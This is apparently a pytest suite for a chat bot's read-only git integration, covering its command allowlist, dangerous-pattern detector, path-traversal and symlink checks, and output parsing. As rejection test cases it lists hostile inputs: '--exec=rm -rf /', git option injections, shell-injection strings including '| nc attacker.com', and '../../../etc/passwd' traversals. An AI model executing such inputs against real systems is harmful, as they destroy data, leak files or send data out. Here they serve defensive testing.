"""Tests for git integration feature."""

import asyncio
import tempfile
from datetime import datetime
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, Mock, patch

import pytest

from src.bot.features.git_integration import (
    CommitInfo,
    GitError,
    GitIntegration,
    GitStatus,
)
from src.config.settings import Settings
from src.exceptions import SecurityError


@pytest.fixture
def temp_dir():
    """Create temporary directory for testing."""
    with tempfile.TemporaryDirectory() as temp_dir:
        yield Path(temp_dir)


@pytest.fixture
def settings(temp_dir):
    """Create test settings."""
    return Settings(
        telegram_bot_token="test_token",
        telegram_bot_username="test_bot",
        approved_directory=str(temp_dir),
        allowed_users=[123456789],
    )


@pytest.fixture
def git_integration(settings):
    """Create git integration instance."""
    return GitIntegration(settings)


@pytest.fixture
def repo_path(temp_dir):
    """Create a test repository path."""
    repo = temp_dir / "test_repo"
    repo.mkdir()
    return repo


class TestGitIntegrationInitialization:
    """Test GitIntegration initialization."""

    def test_initialization(self, git_integration, settings):
        """Test git integration is properly initialized."""
        assert git_integration.settings == settings
        assert git_integration.approved_dir.exists()

    def test_safe_commands_defined(self, git_integration):
        """Test safe commands are properly defined."""
        assert "status" in git_integration.SAFE_COMMANDS
        assert "log" in git_integration.SAFE_COMMANDS
        assert "diff" in git_integration.SAFE_COMMANDS
        assert "branch" in git_integration.SAFE_COMMANDS

    def test_dangerous_patterns_defined(self, git_integration):
        """Test dangerous patterns are defined."""
        assert len(git_integration.DANGEROUS_PATTERNS) > 0
        assert any("exec" in pattern for pattern in git_integration.DANGEROUS_PATTERNS)


class TestGitStatusDataClass:
    """Test GitStatus dataclass."""

    def test_git_status_creation(self):
        """Test creating GitStatus object."""
        status = GitStatus(
            branch="main",
            modified=["file1.py"],
            added=["file2.py"],
            deleted=["file3.py"],
            untracked=["file4.py"],
            ahead=2,
            behind=1,
        )

        assert status.branch == "main"
        assert len(status.modified) == 1
        assert len(status.added) == 1
        assert len(status.deleted) == 1
        assert len(status.untracked) == 1
        assert status.ahead == 2
        assert status.behind == 1

    def test_is_clean_with_no_changes(self):
        """Test is_clean returns True for clean working directory."""
        status = GitStatus(
            branch="main",
            modified=[],
            added=[],
            deleted=[],
            untracked=[],
            ahead=0,
            behind=0,
        )

        assert status.is_clean is True

    def test_is_clean_with_changes(self):
        """Test is_clean returns False with changes."""
        status = GitStatus(
            branch="main",
            modified=["file.py"],
            added=[],
            deleted=[],
            untracked=[],
            ahead=0,
            behind=0,
        )

        assert status.is_clean is False


class TestCommitInfoDataClass:
    """Test CommitInfo dataclass."""

    def test_commit_info_creation(self):
        """Test creating CommitInfo object."""
        commit = CommitInfo(
            hash="abc12345",
            author="John Doe",
            date=datetime(2024, 1, 1, 12, 0, 0),
            message="Initial commit",
            files_changed=3,
            insertions=100,
            deletions=20,
        )

        assert commit.hash == "abc12345"
        assert commit.author == "John Doe"
        assert commit.message == "Initial commit"
        assert commit.files_changed == 3
        assert commit.insertions == 100
        assert commit.deletions == 20


class TestCommandValidation:
    """Test git command validation."""

    @pytest.mark.asyncio
    async def test_reject_non_git_command(self, git_integration, repo_path):
        """Test rejection of non-git commands."""
        with pytest.raises(SecurityError, match="Only git commands allowed"):
            await git_integration.execute_git_command(["ls", "-la"], repo_path)

    @pytest.mark.asyncio
    async def test_reject_empty_command(self, git_integration, repo_path):
        """Test rejection of empty command."""
        with pytest.raises(SecurityError):
            await git_integration.execute_git_command([], repo_path)

    @pytest.mark.asyncio
    async def test_reject_unsafe_git_command(self, git_integration, repo_path):
        """Test rejection of unsafe git commands."""
        unsafe_commands = [
            ["git", "push"],
            ["git", "pull"],
            ["git", "commit"],
            ["git", "add"],
            ["git", "rm"],
            ["git", "reset"],
            ["git", "checkout"],
        ]

        for cmd in unsafe_commands:
            with pytest.raises(SecurityError, match="Unsafe git command"):
                await git_integration.execute_git_command(cmd, repo_path)

    @pytest.mark.asyncio
    async def test_allow_safe_git_commands(self, git_integration, repo_path):
        """Test that safe git commands pass validation."""
        safe_commands = [
            ["git", "status"],
            ["git", "log"],
            ["git", "diff"],
            ["git", "branch"],
        ]

        for cmd in safe_commands:
            # Mock the subprocess to avoid actual git execution
            with patch("asyncio.create_subprocess_exec") as mock_exec:
                mock_process = AsyncMock()
                mock_process.communicate = AsyncMock(return_value=(b"output", b""))
                mock_process.returncode = 0
                mock_exec.return_value = mock_process

                # Should not raise SecurityError
                try:
                    await git_integration.execute_git_command(cmd, repo_path)
                except GitError:
                    pass  # GitError is ok, we're testing SecurityError


class TestDangerousPatternDetection:
    """Test detection of dangerous patterns in commands."""

    @pytest.mark.asyncio
    async def test_detect_exec_pattern(self, git_integration, repo_path):
        """Test detection of --exec pattern."""
        with pytest.raises(SecurityError, match="Dangerous pattern detected"):
            await git_integration.execute_git_command(
                ["git", "status", "--exec=rm -rf /"], repo_path
            )

    @pytest.mark.asyncio
    async def test_detect_upload_pack_pattern(self, git_integration, repo_path):
        """Test detection of --upload-pack pattern."""
        with pytest.raises(SecurityError, match="Dangerous pattern detected"):
            await git_integration.execute_git_command(
                ["git", "log", "--upload-pack=/path/to/malicious"], repo_path
            )

    @pytest.mark.asyncio
    async def test_detect_git_proxy_pattern(self, git_integration, repo_path):
        """Test detection of core.gitProxy pattern."""
        with pytest.raises(SecurityError, match="Dangerous pattern detected"):
            await git_integration.execute_git_command(
                ["git", "status", "-c", "core.gitProxy=malicious"], repo_path
            )

    @pytest.mark.asyncio
    async def test_detect_ssh_command_pattern(self, git_integration, repo_path):
        """Test detection of core.sshCommand pattern."""
        with pytest.raises(SecurityError, match="Dangerous pattern detected"):
            await git_integration.execute_git_command(
                ["git", "log", "-c", "core.sshCommand=evil"], repo_path
            )

    @pytest.mark.asyncio
    async def test_case_insensitive_pattern_matching(self, git_integration, repo_path):
        """Test pattern matching is case insensitive."""
        with pytest.raises(SecurityError, match="Dangerous pattern detected"):
            await git_integration.execute_git_command(
                ["git", "status", "--EXEC=malicious"], repo_path
            )


class TestPathValidation:
    """Test working directory path validation."""

    @pytest.mark.asyncio
    async def test_reject_path_outside_approved_directory(
        self, git_integration, temp_dir
    ):
        """Test rejection of paths outside approved directory."""
        outside_path = Path("/tmp/outside_repo")

        with patch("asyncio.create_subprocess_exec") as mock_exec:
            with pytest.raises(SecurityError, match="outside approved directory"):
                await git_integration.execute_git_command(
                    ["git", "status"], outside_path
                )

    @pytest.mark.asyncio
    async def test_accept_path_inside_approved_directory(
        self, git_integration, repo_path
    ):
        """Test acceptance of paths inside approved directory."""
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            mock_process = AsyncMock()
            mock_process.communicate = AsyncMock(return_value=(b"output", b""))
            mock_process.returncode = 0
            mock_exec.return_value = mock_process

            # Should not raise SecurityError
            try:
                await git_integration.execute_git_command(["git", "status"], repo_path)
            except GitError:
                pass  # GitError is ok

    @pytest.mark.asyncio
    async def test_reject_path_traversal_in_cwd(self, git_integration, temp_dir):
        """Test rejection of path traversal in working directory."""
        # Try to use path traversal to escape approved directory
        traversal_path = temp_dir / "repo" / ".." / ".." / "etc"

        with pytest.raises(SecurityError):
            await git_integration.execute_git_command(
                ["git", "status"], traversal_path
            )


class TestGitCommandExecution:
    """Test git command execution."""

    @pytest.mark.asyncio
    async def test_successful_command_execution(self, git_integration, repo_path):
        """Test successful git command execution."""
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            mock_process = AsyncMock()
            mock_process.communicate = AsyncMock(
                return_value=(b"test output", b"test error")
            )
            mock_process.returncode = 0
            mock_exec.return_value = mock_process

            stdout, stderr = await git_integration.execute_git_command(
                ["git", "status"], repo_path
            )

            assert stdout == "test output"
            assert stderr == "test error"

    @pytest.mark.asyncio
    async def test_failed_command_execution(self, git_integration, repo_path):
        """Test failed git command execution."""
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            mock_process = AsyncMock()
            mock_process.communicate = AsyncMock(
                return_value=(b"", b"fatal: not a git repository")
            )
            mock_process.returncode = 128
            mock_exec.return_value = mock_process

            with pytest.raises(GitError, match="Git command failed"):
                await git_integration.execute_git_command(["git", "status"], repo_path)

    @pytest.mark.asyncio
    async def test_command_timeout(self, git_integration, repo_path):
        """Test handling of command timeout."""
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            mock_process = AsyncMock()
            mock_process.communicate = AsyncMock(
                side_effect=asyncio.TimeoutError("Command timed out")
            )
            mock_exec.return_value = mock_process

            with pytest.raises(GitError, match="timed out"):
                await git_integration.execute_git_command(["git", "log"], repo_path)

    @pytest.mark.asyncio
    async def test_command_exception_handling(self, git_integration, repo_path):
        """Test handling of exceptions during command execution."""
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            mock_exec.side_effect = OSError("Permission denied")

            with pytest.raises(GitError, match="Failed to execute"):
                await git_integration.execute_git_command(["git", "status"], repo_path)


class TestGetStatus:
    """Test getting repository status."""

    @pytest.mark.asyncio
    async def test_get_status_clean_repo(self, git_integration, repo_path):
        """Test getting status of clean repository."""
        with patch.object(git_integration, "execute_git_command") as mock_cmd:
            mock_cmd.side_effect = [
                ("main\n", ""),  # branch
                ("", ""),  # status --porcelain
            ]

            status = await git_integration.get_status(repo_path)

            assert status.branch == "main"
            assert status.is_clean is True
            assert len(status.modified) == 0
            assert len(status.added) == 0
            assert len(status.deleted) == 0
            assert len(status.untracked) == 0

    @pytest.mark.asyncio
    async def test_get_status_with_changes(self, git_integration, repo_path):
        """Test getting status with various changes."""
        with patch.object(git_integration, "execute_git_command") as mock_cmd:
            porcelain_output = (
                " M modified.py\n"
                "A  added.py\n"
                " D deleted.py\n"
                "?? untracked.py\n"
            )
            mock_cmd.side_effect = [
                ("feature-branch\n", ""),
                (porcelain_output, ""),
            ]

            status = await git_integration.get_status(repo_path)

            assert status.branch == "feature-branch"
            assert status.is_clean is False
            assert "modified.py" in status.modified
            assert "added.py" in status.added
            assert "deleted.py" in status.deleted
            assert "untracked.py" in status.untracked

    @pytest.mark.asyncio
    async def test_get_status_with_tracking(self, git_integration, repo_path):
        """Test getting status with upstream tracking info."""
        with patch.object(git_integration, "execute_git_command") as mock_cmd:
            mock_cmd.side_effect = [
                ("main\n", ""),
                ("", ""),
                ("3\t2\n", ""),  # ahead=3, behind=2
            ]

            status = await git_integration.get_status(repo_path)

            assert status.ahead == 3
            assert status.behind == 2

    @pytest.mark.asyncio
    async def test_get_status_no_upstream(self, git_integration, repo_path):
        """Test getting status with no upstream configured."""
        with patch.object(git_integration, "execute_git_command") as mock_cmd:
            mock_cmd.side_effect = [
                ("main\n", ""),
                ("", ""),
                GitError("no upstream"),  # No upstream configured
            ]

            status = await git_integration.get_status(repo_path)

            assert status.ahead == 0
            assert status.behind == 0

    @pytest.mark.asyncio
    async def test_get_status_detached_head(self, git_integration, repo_path):
        """Test getting status in detached HEAD state."""
        with patch.object(git_integration, "execute_git_command") as mock_cmd:
            mock_cmd.side_effect = [
                ("", ""),  # Empty branch output = detached HEAD
                ("", ""),
            ]

            status = await git_integration.get_status(repo_path)

            assert status.branch == "HEAD"


class TestGetDiff:
    """Test getting repository diff."""

    @pytest.mark.asyncio
    async def test_get_diff_unstaged(self, git_integration, repo_path):
        """Test getting unstaged diff."""
        diff_output = (
            "diff --git a/file.py b/file.py\n"
            "@@ -1,3 +1,4 @@\n"
            " unchanged line\n"
            "-removed line\n"
            "+added line\n"
        )

        with patch.object(git_integration, "execute_git_command") as mock_cmd:
            mock_cmd.return_value = (diff_output, "")

            diff = await git_integration.get_diff(repo_path, staged=False)

            assert "➕ added line" in diff
            assert "➖ removed line" in diff
            assert "📍 @@" in diff

    @pytest.mark.asyncio
    async def test_get_diff_staged(self, git_integration, repo_path):
        """Test getting staged diff."""
        with patch.object(git_integration, "execute_git_command") as mock_cmd:
            mock_cmd.return_value = ("+added", "")

            diff = await git_integration.get_diff(repo_path, staged=True)

            # Verify --staged flag was used
            call_args = mock_cmd.call_args[0][0]
            assert "--staged" in call_args

    @pytest.mark.asyncio
    async def test_get_diff_specific_file(self, git_integration, repo_path):
        """Test getting diff for specific file."""
        test_file = repo_path / "test.py"
        test_file.touch()

        with patch.object(git_integration, "execute_git_command") as mock_cmd:
            mock_cmd.return_value = ("+change", "")

            diff = await git_integration.get_diff(repo_path, file_path="test.py")

            # Verify file path was included in command
            call_args = mock_cmd.call_args[0][0]
            assert "test.py" in call_args

    @pytest.mark.asyncio
    async def test_get_diff_file_path_traversal_protection(
        self, git_integration, repo_path
    ):
        """Test protection against path traversal in file diff."""
        with pytest.raises(SecurityError, match="outside repository"):
            await git_integration.get_diff(repo_path, file_path="../../../etc/passwd")

    @pytest.mark.asyncio
    async def test_get_diff_no_changes(self, git_integration, repo_path):
        """Test getting diff with no changes."""
        with patch.object(git_integration, "execute_git_command") as mock_cmd:
            mock_cmd.return_value = ("", "")

            diff = await git_integration.get_diff(repo_path)

            assert diff == "No changes to show"


class TestGetFileHistory:
    """Test getting file commit history."""

    @pytest.mark.asyncio
    async def test_get_file_history(self, git_integration, repo_path):
        """Test getting file history."""
        test_file = repo_path / "test.py"
        test_file.touch()

        log_output = (
            "abc12345|John Doe|2024-01-01T12:00:00Z|Initial commit\n"
            "10\t5\ttest.py\n"
            "\n"
            "def67890|Jane Doe|2024-01-02T14:30:00Z|Update file\n"
            "3\t2\ttest.py\n"
        )

        with patch.object(git_integration, "execute_git_command") as mock_cmd:
            mock_cmd.return_value = (log_output, "")

            history = await git_integration.get_file_history(repo_path, "test.py")

            assert len(history) == 2
            assert history[0].hash == "abc12345"
            assert history[0].author == "John Doe"
            assert history[0].message == "Initial commit"
            assert history[0].insertions == 10
            assert history[0].deletions == 5
            assert history[1].hash == "def67890"

    @pytest.mark.asyncio
    async def test_get_file_history_with_limit(self, git_integration, repo_path):
        """Test getting file history with limit."""
        test_file = repo_path / "test.py"
        test_file.touch()

        with patch.object(git_integration, "execute_git_command") as mock_cmd:
            mock_cmd.return_value = ("", "")

            await git_integration.get_file_history(repo_path, "test.py", limit=5)

            # Verify limit was passed to git command
            call_args = mock_cmd.call_args[0][0]
            assert "--max-count=5" in call_args

    @pytest.mark.asyncio
    async def test_get_file_history_path_traversal_protection(
        self, git_integration, repo_path
    ):
        """Test protection against path traversal in file history."""
        with pytest.raises(SecurityError, match="outside repository"):
            await git_integration.get_file_history(
                repo_path, "../../../etc/passwd"
            )

    @pytest.mark.asyncio
    async def test_get_file_history_binary_files(self, git_integration, repo_path):
        """Test getting history for binary files."""
        test_file = repo_path / "image.png"
        test_file.touch()

        log_output = (
            "abc12345|Author|2024-01-01T12:00:00Z|Add image\n"
            "-\t-\timage.png\n"
        )

        with patch.object(git_integration, "execute_git_command") as mock_cmd:
            mock_cmd.return_value = (log_output, "")

            history = await git_integration.get_file_history(repo_path, "image.png")

            # Binary files show - for stats
            assert len(history) == 1
            assert history[0].insertions == 0
            assert history[0].deletions == 0


class TestFormatStatus:
    """Test status formatting."""

    def test_format_clean_status(self, git_integration):
        """Test formatting clean repository status."""
        status = GitStatus(
            branch="main",
            modified=[],
            added=[],
            deleted=[],
            untracked=[],
            ahead=0,
            behind=0,
        )

        formatted = git_integration.format_status(status)

        assert "🌿 Branch: main" in formatted
        assert "✅ Working tree clean" in formatted

    def test_format_status_with_changes(self, git_integration):
        """Test formatting status with changes."""
        status = GitStatus(
            branch="feature",
            modified=["file1.py", "file2.py"],
            added=["new.py"],
            deleted=["old.py"],
            untracked=["temp.py"],
            ahead=2,
            behind=1,
        )

        formatted = git_integration.format_status(status)

        assert "🌿 Branch: feature" in formatted
        assert "📊 Tracking:" in formatted
        assert "↑2" in formatted
        assert "↓1" in formatted
        assert "📝 Modified: 2 files" in formatted
        assert "➕ Added: 1 files" in formatted
        assert "➖ Deleted: 1 files" in formatted
        assert "❓ Untracked: 1 files" in formatted

    def test_format_status_many_files(self, git_integration):
        """Test formatting status with many files."""
        modified_files = [f"file{i}.py" for i in range(10)]
        status = GitStatus(
            branch="main",
            modified=modified_files,
            added=[],
            deleted=[],
            untracked=[],
            ahead=0,
            behind=0,
        )

        formatted = git_integration.format_status(status)

        # Should show first 5 and indicate more
        assert "... and 5 more" in formatted


class TestFormatHistory:
    """Test history formatting."""

    def test_format_commit_history(self, git_integration):
        """Test formatting commit history."""
        commits = [
            CommitInfo(
                hash="abc12345",
                author="John Doe",
                date=datetime(2024, 1, 1, 12, 0, 0),
                message="Initial commit",
                files_changed=3,
                insertions=100,
                deletions=20,
            ),
            CommitInfo(
                hash="def67890",
                author="Jane Doe",
                date=datetime(2024, 1, 2, 14, 30, 0),
                message="Add feature",
                files_changed=1,
                insertions=50,
                deletions=0,
            ),
        ]

        formatted = git_integration.format_history(commits)

        assert "📜 Commit History:" in formatted
        assert "abc12345" in formatted
        assert "John Doe" in formatted
        assert "Initial commit" in formatted
        assert "+100" in formatted
        assert "-20" in formatted
        assert "def67890" in formatted
        assert "Jane Doe" in formatted

    def test_format_empty_history(self, git_integration):
        """Test formatting empty history."""
        formatted = git_integration.format_history([])

        assert "No commit history found" in formatted


class TestEdgeCases:
    """Test edge cases and error scenarios."""

    @pytest.mark.asyncio
    async def test_malformed_status_output(self, git_integration, repo_path):
        """Test handling malformed git status output."""
        with patch.object(git_integration, "execute_git_command") as mock_cmd:
            # Malformed output
            mock_cmd.side_effect = [
                ("main\n", ""),
                ("malformed\noutput\n", ""),
            ]

            # Should not crash
            status = await git_integration.get_status(repo_path)
            assert isinstance(status, GitStatus)

    @pytest.mark.asyncio
    async def test_malformed_log_output(self, git_integration, repo_path):
        """Test handling malformed git log output."""
        test_file = repo_path / "test.py"
        test_file.touch()

        with patch.object(git_integration, "execute_git_command") as mock_cmd:
            mock_cmd.return_value = ("malformed|output\n", "")

            # Should not crash
            history = await git_integration.get_file_history(repo_path, "test.py")
            assert isinstance(history, list)

    @pytest.mark.asyncio
    async def test_unicode_in_commit_messages(self, git_integration, repo_path):
        """Test handling unicode in commit messages."""
        test_file = repo_path / "test.py"
        test_file.touch()

        log_output = "abc12345|Author|2024-01-01T12:00:00Z|Fix bug 🐛\n5\t3\ttest.py"

        with patch.object(git_integration, "execute_git_command") as mock_cmd:
            mock_cmd.return_value = (log_output, "")

            history = await git_integration.get_file_history(repo_path, "test.py")

            assert len(history) == 1
            assert "🐛" in history[0].message


class TestSecurityScenarios:
    """Test various security scenarios."""

    @pytest.mark.asyncio
    async def test_command_injection_via_arguments(self, git_integration, repo_path):
        """Test protection against command injection via arguments."""
        malicious_commands = [
            ["git", "status", "; rm -rf /"],
            ["git", "log", "$(malicious)"],
            ["git", "diff", "`whoami`"],
            ["git", "branch", "| nc attacker.com"],
        ]

        for cmd in malicious_commands:
            # These should be caught by either command validation or pattern detection
            with pytest.raises(SecurityError):
                await git_integration.execute_git_command(cmd, repo_path)

    @pytest.mark.asyncio
    async def test_symlink_attack_in_repo_path(self, git_integration, temp_dir):
        """Test handling of symlinks in repository path."""
        # Create a directory outside approved
        outside = Path("/tmp/outside_approved")
        outside.mkdir(exist_ok=True)

        try:
            # Create symlink inside approved directory pointing outside
            link = temp_dir / "malicious_link"
            if not link.exists():
                link.symlink_to(outside)

            # Should be detected as outside approved directory after resolution
            with pytest.raises(SecurityError):
                with patch("asyncio.create_subprocess_exec"):
                    await git_integration.execute_git_command(["git", "status"], link)
        finally:
            # Cleanup
            if outside.exists():
                outside.rmdir()

    @pytest.mark.asyncio
    async def test_subprocess_escape_via_shell(self, git_integration, repo_path):
        """Test that subprocess is called without shell=True."""
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            mock_process = AsyncMock()
            mock_process.communicate = AsyncMock(return_value=(b"", b""))
            mock_process.returncode = 0
            mock_exec.return_value = mock_process

            await git_integration.execute_git_command(["git", "status"], repo_path)

            # Verify shell=False (default) was used
            call_kwargs = mock_exec.call_args[1]
            assert "shell" not in call_kwargs or call_kwargs.get("shell") is False
